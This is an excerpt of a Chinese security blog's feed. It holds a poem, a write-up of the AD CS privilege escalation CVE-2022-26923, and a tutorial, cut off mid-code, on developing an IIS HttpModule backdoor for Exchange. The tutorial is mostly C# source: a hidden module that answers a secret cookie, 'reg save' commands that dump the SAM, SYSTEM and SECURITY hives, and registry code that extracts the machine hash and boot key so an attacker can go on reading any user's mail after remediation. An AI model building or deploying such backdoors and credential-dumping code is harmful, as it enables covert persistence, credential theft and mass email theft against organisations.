    <link href="/2022/05/13/%E6%97%A0%E9%A2%98/"/>
    <url>/2022/05/13/%E6%97%A0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="无题"><a href="#无题" class="headerlink" title="无题"></a>无题</h1><p>黑云压天暮，星星烛火危<br>槁枝席地枕，不见行者归<br>偶得檐下雀，苍发染风霜<br>三杯凉夜色，对饮到天明</p>]]></content>
    
    
    <categories>
      
      <category>牢骚</category>
      
    </categories>
    
    
    <tags>
      
      <tag>牢骚</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-26923——又一个ADCS提权</title>
    <link href="/2022/05/12/%E5%8F%88%E4%B8%80%E4%B8%AAADCS%E6%8F%90%E6%9D%83/"/>
    <url>/2022/05/12/%E5%8F%88%E4%B8%80%E4%B8%AAADCS%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周二的微软补丁日中发布了一个针对ADCS 模板滥用漏洞得补丁，相对应的CVE编号是CVE-2022-26923。在经历了spring、vmware、veeam backup和f5等诸多大型产品的漏洞洗礼后，AD终于也迎来了自己的漏洞。漏洞描述中，该漏洞允许拥有普通用户权限的攻击者，实现域内权限提升，获得域控权限。</p><p>自从 2021年那篇针对ADCS的白皮书 <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified_Pre-Owned</a> 发布以后，ADCS的安全问题就收到了广泛关注，之前的白皮书中一共总结了ECS 1-8 八种错误配置模板，都可以帮助攻击者轻松获得域控权限，而这次的 CVE-2022-26923 同样是利用了 ADCS 模板的某些配置问题和 AD的一些 “特性” 获得了权限提升。</p><h2 id="ADCS身份认证"><a href="#ADCS身份认证" class="headerlink" title="ADCS身份认证"></a>ADCS身份认证</h2><p>简单来说，这次的漏洞允许一个拥有普通user权限的攻击者，通过adcs服务，在域内获得权限提升，得到域控的权限。</p><p>其实我个人感觉这次的漏洞和之前爆出的 CVE-2021-42287 和 CVE-2021-42278 （通过更改与域控同名机器获取权限提升）也有相似之处，更像是在某些方面将二者组合。漏洞作者在文章中也说确实是受二者启发。</p><h3 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h3><p>还是简单介绍一下ADCS</p><p><img src="https://miro.medium.com/max/1400/0*hnpRmQCVuKwsSfR6" alt="img"></p><p>引用白皮书中的描述：</p><blockquote><p>AD CS 是一个服务器角色，用作 Microsoft 的公钥基础结构 PKI 实施。正如预期的那样，它与 Active Directory 紧密集成并支持颁发证书，这些证书是 X.509 格式的数字签名电子文档，可用于加密、消息签名和/或身份验证</p></blockquote><p>ADCS 是一套域内的证书服务，安装了ADCS服务的域内允许通过CA签发的证书进行身份认证。本质上来说ADCS同样遵循X.509协议，客户端将公钥与模板等信息发送给服务端，服务端检查客户端身份以及权限是否允许，并按照模板中约定的事项，使用自己的私钥进行签发证书。</p><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>ADCS模板是证书注册策略与配置的集合，它同样是一个AD对象，在ldap中的存储为 <code>CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=cia,DC=local</code>，他存储了所有证书的配置，例如 证书的有效期、用途、主题等。当然并不是所有配置都可以用于注册，而大部分的ADCS攻击面也是针对模板的。</p><p>用户可以根据预定义的证书模板请求证书并应用于不同场景，而本次漏洞所关注的用途依然是客户端身份验证。</p><h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><p>ADCS允许利用于身份认证的场景，一个合法的场景中，用户可以通过正确的凭证向CA申请 <code>User</code> 模板的证书。而后在该证书的有效期内我们都可以通过kerberos中的PKI延展向域控请求有效的TGT票据。</p><h2 id="CVE-2022-26923-1"><a href="#CVE-2022-26923-1" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h2><p>值得注意的是，同样是用于身份认证，然而用户和机器拥有两套模板。这意味着用户和机器使用证书进行身份认证时肯定存在不同的配置，或许是不同的认证参数，或是不同的校验方式。</p><h3 id="User模板"><a href="#User模板" class="headerlink" title="User模板"></a>User模板</h3><p>经过观察发现，用户证书模板中包含User的UPN属性，每一个User角色都包含User Principal Name (UPN)属性，正如服务账户包含SPN一样。而User模板将UPN用于识别用户，即将UPN用于将证书映射到用户本身。</p><p><img src="/img/article2/DC-2022-05-12-04-54-59.png" alt="DC-2022-05-12-04-54-59"></p><p>根据微软的唯一性约束： <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944</a>  ， UPN与SPN一样是强制唯一的，每一个用户拥有唯一的UPN，这意味着我们不可能获取具有两个相同UPN的用户，同理，我们也无法为不同用户申请相同身份映射的证书。</p><h3 id="Machine模板"><a href="#Machine模板" class="headerlink" title="Machine模板"></a>Machine模板</h3><p>然而machine并没有UPN这个参数，那机器用户的证书模板使用什么表明用户身份呢，</p><p><img src="https://miro.medium.com/max/1244/1*aG8taHpqQxaS2F8EpxbKrA.png" alt="img"></p><p>可以看到，模板中指定的是主机的dns值。</p><p>而主机的dns命名，保存在主机用户的 <code>dNSHostName</code> 字段</p><p><img src="/img/article2/image-20220512050605329.png" alt="image-20220512050605329"></p><p>然而值得注意的是，该字段与UPN和SPN不同，**<em>该字段并不具有强制唯一的原则**</em></p><p>而根据微软的策略：<a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name">https://docs.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name</a></p><p>允许兼容不相同的dns名称与主机名。例如，<code>samaccountname</code> 为 <code>test$</code> 的机器，他的 <code>dNSHostName</code>  可以是 <code>qwe.cia.local</code></p><p>这就意味着，我们可以拥有两个有相同 <code>dNSHostName</code>  值的不同机器，同样意味着，或许可以为不同机器申请相同映射的证书。这句话换一种表达就是，或许可以为某台机器申请映射到另一台机器身份的证书。</p><h3 id="漏洞探索"><a href="#漏洞探索" class="headerlink" title="漏洞探索"></a>漏洞探索</h3><p>于是我们可以联想到之前的CVE-2021-42287 和 CVE-2021-42278，或许同样可以将机器用户的<code>dNSHostName</code>  改为域控的值以获得映射到域控的证书。与CVE-2021-42287 和 CVE-2021-42278相同，用户对自己创建的机器的<code>dNSHostName</code> 同样具有写权限</p><p><img src="https://miro.medium.com/max/782/1*06k7JjDjCE9vW7-FTg5KCw.png" alt="img"></p><p>这意味着我们或许可以将其改为与域控相同的值。</p><p>然而此时我们会遇到问题。</p><p><img src="/img/article2/image-20220512053457184.png" alt="image-20220512053457184"></p><p>可以看到机器账户的SPN其中有的是和<code>dNSHostName</code> 相关联的，当<code>dNSHostName</code> 改变时，SPN会相应的改变，而当改为和域控相同时，该SPN理论上会改为部分与域控相同，然而正如前面所说，SPN是唯一性的，并不可以有两个相同的SPN，因此直接更改dNSHostName会间接导致SPN冲突导致失败。</p><p>又经过观察，SPN只有后两个值是包含dNSHostName，而前两个包含的是samaccountname,如果能把他们删掉的话，是不是就不会造成冲突了呢。同样，用户对创建的机器的SPN同样拥有写权限，之前的文章也讨论过针对滥用SPN写权限造成的危害。</p><p><img src="https://miro.medium.com/max/786/1*PMTz0EIYhUNWV5owHu_FNA.png" alt="img"></p><p>于是我们可以将该机器包含dNSHostName的SPN删除，然后就可以成功更改机器的dNSHostName为dc的dNSHostName了！</p><p><img src="/img/article2/image-20220512054645714.png" alt="image-20220512054645714"></p><p>当我们为b1uepc$申请Machine模板的身份认证证书时，成功获取了带有dc的dns名 <code>dc.cia.local</code> 的证书！</p><p><img src="/img/article2/image-20220512054951983.png" alt="image-20220512054951983"></p><h3 id="证书映射"><a href="#证书映射" class="headerlink" title="证书映射"></a>证书映射</h3><p>这次的攻击并不需要像之前的漏洞那样，在申请了tgt后再次更改用户名为其他值，而证书在映射用户时却同样不会产生冲突，这是由于PKINIT 的证书<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/01c4acb8-c366-4d31-93a5-fbf2d59c8b27">映射机制</a>。</p><p>KDC首先从AS-REQ中获取请求主体名，例如 <code>user@cia.local</code> ，根据主题名查找账户。然后根据 UAC ，KDC会根据证书主题中的UPNname或DNSname验证映射。KDC会根据samaccountname和域名验证DNSname，例如当 ‘cia.local\test$’ 的 DNSname 为 ‘test.cia.local’ 时，验证成功。而用户的dNSHostName并不被再次用于验证，该值只在申请证书时用于标明。</p><p>因此，并不需要再次改变用户的dNSHostName。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>针对ADCS的python工具<a href="https://github.com/ly4k/Certipy">Certipy</a> 已经更新关于该漏洞的利用，通过Certipy，我们可以轻松利用CVE-2022-26923进行域内的提权操作</p><ul><li>新建机器账户</li></ul><p><img src="/img/article2/image-20220512060756455.png" alt="新建用户"></p><ul><li>更改dNSHostName并申请证书与票据</li></ul><p><img src="/img/article2/image-20220512060819352.png" alt="申请证书与证书"></p><ul><li>获取hash</li></ul><p><img src="/img/article2/image-20220512060835625.png" alt="获取hash"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下这个漏洞的成因</p><ol><li>机器用户申请的ca证书，使用域信息里的 dNSHostName 参数进行认证</li><li>域内成员的dNSHostName参数不强制唯一</li><li>用户对自己创立的机器用户的dNSHostName与SPN具有写权限</li><li>更改创建的机器用户的dNSHostName为域控同名，获得域控权限</li></ol><p>这也是一个很精彩的漏洞，而且感觉针对这种 “重名” 的利用方式应该还会有其他的姿势等待挖掘，慢慢期待一下。</p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从零到一开发一个exchange后门</title>
    <link href="/2022/03/27/exchange_backdoor/"/>
    <url>/2022/03/27/exchange_backdoor/</url>
    
    <content type="html"><![CDATA[<h1 id="从零到一开发一个exchange后门"><a href="#从零到一开发一个exchange后门" class="headerlink" title="从零到一开发一个exchange后门"></a>从零到一开发一个exchange后门</h1><p>exchange作为微软旗下一款成熟的邮箱应用，在政企中受众很广。最近在项目中，一直在思考针对exchange的持久化问题，考虑的场景为，假定的目标发现并清理了我们的权限，用户也全部修改了密码。但我们仍可以正常的获得用户邮件。（ office365的场景不做讨论）换句话说，即是在没有用户凭据以及漏洞的前提下通过exchange获得任意用户邮件。</p><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p><strong><em>需求：不通过用户凭据以及权限获取任意用户邮件</em></strong></p><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>一开始我考虑的方案是：</p><p><strong><em>通过白银票据，模拟任意用户，登录exchenge的 <code>ews</code> 接口，通过soap请求获得邮件</em></strong></p><p>这个方案需要的条件：</p><ul><li>exchange 机器hash</li><li>域的 sid</li></ul><p>通过白银票据模拟任意用户，伪造服务为 <code>http</code> ，因为白银票据的特点，不需要与域控交互，且 ews 接口支持 <code>negoiet</code> 认证，所以该方法可通过ews处的认证</p><p>然而该方法在后续的实践中还是有一些小麻烦，比如通过代码传递票据等，当时实践不是很顺利</p><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>后来和朋友讨论时，获得了第二个方案</p><p><strong><em>通过exchange机器用户身份登录 ews 接口，通过soap请求获得任意用户邮件</em></strong></p><p>这个方案需要的条件：</p><ul><li>exchange 机器hash</li><li>下载用户的sid</li></ul><p>最终我选用了方案二</p><h3 id="后门结构"><a href="#后门结构" class="headerlink" title="后门结构"></a>后门结构</h3><p>最终我决定了这样的结构：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">client --&gt; backdoor_server ---<span class="hljs-function"><span class="hljs-params">(sid，hash)</span>---&gt;</span> client ---<span class="hljs-function"><span class="hljs-params">(xml)</span>--&gt;</span> backdoor_server ---(mail)---&gt; client<br></code></pre></td></tr></table></figure><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><h3 id="Server端"><a href="#Server端" class="headerlink" title="Server端"></a>Server端</h3><p>无论选用哪种方案，其实需求的条件相差不大，都需要：</p><ul><li>exchange 机器hash</li></ul><p>唯一的区别就是方案二需要用户的sid，方案一只需要域的sid</p><p>所以server端的功能就很清晰了，通过特定请求，获取exchange的机器hash以及指定用户的sid。</p><p>因为exchange可以留aspx文件的目录比较局限，且查杀严格，所以计划改成一个针对iis的 dll 的后门。</p><p>因为之前也并没有系统学习过 c# 或者.net 的开发，所以这次属于现学现写，在网上找到的资料里拼拼凑凑。所幸当你模块与需求明确时，总能找到解决办法。</p><p>一开始需要解决的问题自然是如何开始一个iis的dll后门，他需要能先.net应用去解析请求，识别我们的特定请求并给予响应。</p><h4 id="从IHttpModule开始"><a href="#从IHttpModule开始" class="headerlink" title="从IHttpModule开始"></a>从IHttpModule开始</h4><p>IHttpModule 为 System.web命名空间下的类。他会处理任何针对.net服务端的http请求。在.net 中，IHttpHandler负责处理针对.net注册文件的请求，而IHttpModule先IHttpHandler针对所有http请求进行响应。</p><p><img src="/img/article2/image-20220326045448200.png" alt="image-20220326045448200"></p><p>IHttpHandler接口只有两个成员：</p><ul><li>void Dispose()：处置由实现 System.Web.IHttpModule 的模块使用的资源（内存除外）。</li><li>void Init(HttpApplication context)：初始化模块，并使其为处理请求做好准备。参数:context:一个System.Web.HttpApplication，它提供对 ASP.NET 应用程序内所有应用程序对象的公用的方法、属性和事件的访问</li></ul><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Collections.Generic;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Web;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">IIS_BackDoor</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MyModule</span> : <span class="hljs-title">IHttpModule</span><br>    &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Dispose</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>        &#123;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Init</span>(<span class="hljs-params">HttpApplication context</span>)</span><br><span class="hljs-function"></span>        &#123;<br>            context.PreRequestHandlerExecute += <span class="hljs-keyword">new</span> EventHandler(Context_PreRequestHandlerExecute);<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Context_PreRequestHandlerExecute</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span><br><span class="hljs-function"></span>        &#123;<br>            <span class="hljs-comment">// do somthing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="针对iis的后门"><a href="#针对iis的后门" class="headerlink" title="针对iis的后门"></a>针对iis的后门</h4><p>Microsoft 定义了一个称为 ISAPI（Internet 服务器应用程序编程接口）的 API，以帮助开发人员向 IIS 添加功能。ISAPI几乎控制着IIS中一切动态内容的生命，因为只有ISAPI，才可以构建动态内容交互式网页（如ASPX/PHP等）可以理解为解释器。</p><p>可以向 IIS 添加一种组件：过滤器。</p><ul><li>过滤器是导出 3 个函数的 DLL：</li></ul><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">GetFilterVersion</span><br><span class="hljs-attribute">HttpFilterProc</span><br><span class="hljs-attribute">TerminateFilter</span><br></code></pre></td></tr></table></figure><p>过滤器注册了许多事件，每次在请求的生命周期内发生事件时，都会调用 HttpFilterProc。以下是过滤器可以注册的事件的不完整列表：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">SF_NOTIFY_PREPROC_HEADERS:</span> happens <span class="hljs-keyword">when</span> IIS has finished preprocessing headers.<br><span class="hljs-symbol">SF_NOTIFY_SEND_RESPONSE:</span> happens <span class="hljs-keyword">when</span> IIS <span class="hljs-built_in">is</span> ready <span class="hljs-keyword">to</span> send response <span class="hljs-keyword">to</span> the client<br><span class="hljs-symbol">SF_NOTIFY_END_OF_REQUEST:</span> happens <span class="hljs-keyword">when</span> a request has ended its lifecycle<br><span class="hljs-symbol">SF_NOTIFY_LOG:</span> happens before IIS writes log <span class="hljs-keyword">for</span> the current request<br></code></pre></td></tr></table></figure><p>由上可知，可通过http请求的多处参数来触发filter。一旦触发，就会调用过滤器的 HttpFilterProc 并提供一个结构，具体取决于事件的类型。</p><p>不过filter只支持c++实现，但我们通过 IHttpModule 也同样可以实现如同isapi接口filter相同的功能。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">context_filter</span>(<span class="hljs-params">HttpContext context, HttpRequest Request</span>)</span><br><span class="hljs-function"></span>        &#123;<br>            HttpCookieCollection MyCookieColl;<br>            HttpCookie MyCookie;<br>            MyCookieColl = Request.Cookies;<br>            String[] arr1 = MyCookieColl.AllKeys;<br><br>            <span class="hljs-keyword">if</span> (arr1.Length &gt; <span class="hljs-number">0</span>)<br>            &#123;<br>                MyCookie = MyCookieColl[arr1[<span class="hljs-number">0</span>]];<br>                <span class="hljs-keyword">if</span> (MyCookie.Name.Equals(<span class="hljs-string">&quot;test&quot;</span>))<br>                &#123;<br>                    String cookie = MyCookie.Value;<br>                    context.Response.Clear();<br>                    context.Response.Write(<span class="hljs-string">&quot;test&quot;</span>);<br>                    allResults.Clear();<br>                    context.Response.End();<br>                    context.Response.Close();<br>            &#125;<br></code></pre></td></tr></table></figure><p>如上代码，通过HttpModule也可实现如同filter的功能。当我们收到包含 cookie 值”test”  的请求时，会先aspx等文件被IHttpModule处理，在页面输出 “test”。这样就可以基本达到后门的需求。</p><p>现在我们的基本框架已经基本完成，下面要开始实现具体的模块。</p><h4 id="获得hash"><a href="#获得hash" class="headerlink" title="获得hash"></a>获得hash</h4><p>参考：<a href="https://www.freebuf.com/articles/system/224171.html">https://www.freebuf.com/articles/system/224171.html</a></p><p><img src="/img/article2/image-20220327042513851.png" alt="image-20220327042513851"></p><p>最先需要完成的就是获取机器hash的功能。</p><p>通过我们日常的攻防测试我们可以知道，我们可以通过机器的注册表获得用户的凭据。</p><p>一般我们会用到：</p><ul><li>sam：sam数据库保存windows本地的用户信息</li><li>system：system数据库中保存 bootkey 用于解密sam中保存的解密的hash</li><li>security：存储lsa策略，缓存域内登录的用户与服务信息。</li></ul><p>一般通过如下方式导出</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\sam sam<br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\system system<br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\security security<br></code></pre></td></tr></table></figure><p>转储注册表，然后可以通过 <code>secretsdump.py</code> 来获取机器hash</p><p>现在我们需要通过 c# 来完成这些操作，所以过程应该就是：</p><ul><li>获取注册表内容 —–&gt; 解密</li></ul><p>而我们想要获得的时机器hash，所以我们需要的是security注册表</p><p>当用域账号去登陆这台机器，在登陆成功后（域控验证了你的身份后），系统会将你的凭据以及授权信息保存在注册表里面。默认是保存 10 个凭据（可以对这个值进行更改）。当被保存的凭据已经超过 10 个的话，新的凭据会覆盖掉老的凭据。</p><p>凭据被缓存在注册表里的这些用户，在机器连不上域控的时候也可以登陆这台机器（只能交互式登陆，比如控制台或远程桌面)。</p><p><img src="/img/article2/image-20220327030321316.png" alt="image-20220327030321316"></p><h5 id="注册表服务"><a href="#注册表服务" class="headerlink" title="注册表服务"></a>注册表服务</h5><p>参考了网络上获取注册表的方式</p><p>首先加载指定机器的注册表服务</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">class</span> <span class="hljs-title">RemoteOps</span><br>    &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> hostname;<br>        IntPtr scMgr = IntPtr.Zero;<br>        <span class="hljs-keyword">public</span> IntPtr remoteRegHandle = IntPtr.Zero;<br>        <span class="hljs-built_in">int</span> remoteRegistryInitialStatus = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">bool</span> remoteRegistryDisabled = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">RemoteOps</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> remoteHostname</span>)</span><br><span class="hljs-function"></span>        &#123;<br>            hostname = remoteHostname;<br>            StartRemoteRegistry();<br>        &#125;<br></code></pre></td></tr></table></figure><p>然后可以通过 <code>advapi32.dll</code> 中提供的注册表函数去读取注册表信息</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c#">[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;advapi32&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-built_in">int</span> <span class="hljs-title">RegConnectRegistry</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> machine, UIntPtr hKey, <span class="hljs-keyword">out</span> IntPtr pRemKey</span>)</span>;<br><br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;Advapi32.dll&quot;</span>, EntryPoint = <span class="hljs-meta-string">&quot;RegGetValueW&quot;</span>, CharSet = CharSet.Unicode, SetLastError = true)</span>]<br><span class="hljs-function"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> Int32 <span class="hljs-title">RegGetValue</span>(<span class="hljs-params">IntPtr hkey, <span class="hljs-built_in">string</span> lpSubKey, <span class="hljs-built_in">string</span> lpValue, uint dwFlags, <span class="hljs-keyword">out</span> uint pdwType, IntPtr pvData, <span class="hljs-keyword">ref</span> Int32 pcbData</span>)</span>;<br><br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;advapi32.dll&quot;</span>, CharSet = CharSet.Unicode, EntryPoint = <span class="hljs-meta-string">&quot;RegOpenKeyExW&quot;</span>, SetLastError = true)</span>]<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-built_in">int</span> <span class="hljs-title">RegOpenKeyEx</span>(<span class="hljs-params">IntPtr hKey, <span class="hljs-built_in">string</span> subKey, uint options, <span class="hljs-built_in">int</span> sam, <span class="hljs-keyword">out</span> IntPtr phkResult</span>)</span>;<br><br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;advapi32.dll&quot;</span>, CharSet = CharSet.Unicode, SetLastError = true)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-built_in">int</span> <span class="hljs-title">RegQueryInfoKey</span>(<span class="hljs-params">IntPtr hKey, [Out(</span>)] StringBuilder lpClass, <span class="hljs-keyword">ref</span> uint lpcchClass,</span><br><span class="hljs-function">                                  IntPtr lpReserved, IntPtr lpcSubkey, IntPtr lpcchMaxSubkeyLen,</span><br><span class="hljs-function">                                  IntPtr lpcchMaxClassLen, IntPtr lpcValues, IntPtr lpcchMaxValueNameLen,</span><br><span class="hljs-function">                                  IntPtr lpcbMaxValueLen, IntPtr lpSecurityDescriptor, IntPtr lpftLastWriteTime)</span>;<br></code></pre></td></tr></table></figure><ul><li>RegOpenKeyEx：此函数打开指定的键</li><li>RegQueryInfoKey：此函数检索有关指定注册表项的信息。</li><li>RegGetValue：检索指定注册表值的类型和数据。</li></ul><p><img src="/img/article2/image-20220327042200521.png" alt="image-20220327042200521"></p><p>定义OpenRegKey函数获得注册表句柄</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">public</span> IntPtr <span class="hljs-title">OpenRegKey</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> key</span>)</span><br><span class="hljs-function"></span>        &#123;<br>            <span class="hljs-built_in">int</span> KEY_MAXIMUM_ALLOWED = <span class="hljs-number">0x02000000</span>;<br>            IntPtr regKeyHandle;<br>            <span class="hljs-keyword">if</span> (RegOpenKeyEx(remoteRegHandle, key, <span class="hljs-number">0</span>, KEY_MAXIMUM_ALLOWED, <span class="hljs-keyword">out</span> regKeyHandle) == <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> regKeyHandle;<br>            &#125;<br></code></pre></td></tr></table></figure><h5 id="获取security"><a href="#获取security" class="headerlink" title="获取security"></a>获取security</h5><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c#">RemoteOps remoteConnection = <span class="hljs-keyword">new</span> RemoteOps(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>);<br><span class="hljs-built_in">byte</span>[] bootKey = GetBootKey(<span class="hljs-keyword">ref</span> remoteConnection);<br><span class="hljs-built_in">string</span> securityRemoteLocation = <span class="hljs-string">@&quot;\\&quot;</span> + singleTarget + <span class="hljs-string">@&quot;\ADMIN$\&quot;</span> + securityOut;<br><span class="hljs-keyword">if</span> (remoteConnection.SaveRegKey(<span class="hljs-string">&quot;SECURITY&quot;</span>, <span class="hljs-string">@&quot;\Windows\&quot;</span> + <span class="hljs-string">&#x27;security.log&#x27;</span>))<br>&#123;<br><br>    RegistryHive security = remoteConnection.GetRemoteHiveDump(securityRemoteLocation);<br>remoteConnection.Cleanup(samRemoteLocation, securityRemoteLocation);<br>allResults.Add(singleHostResults);<br></code></pre></td></tr></table></figure><p>解密同样需要获得bootkey</p><p>bootkey是由四个分离的部分组成的，<code>SYSTEM\CurrentControlSet\Control\Lsa\&#123;JD,Skew1,GBG,Data&#125;</code>，但是我们实际中要用到的数据是无法直接使用regedit看到的，而且，每一部分都被存到了这些键的Class属性中，而且进行了Unicode编码，以16进制的形式存储。BootKey的长度为16字节，获得了bootKey后，还需要进行解混淆操作</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">GetBootKey</span>(<span class="hljs-params"><span class="hljs-keyword">ref</span> RemoteOps remoteConnection</span>)</span><br><span class="hljs-function"></span>        &#123;<br>            <span class="hljs-built_in">string</span>[] keys = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[<span 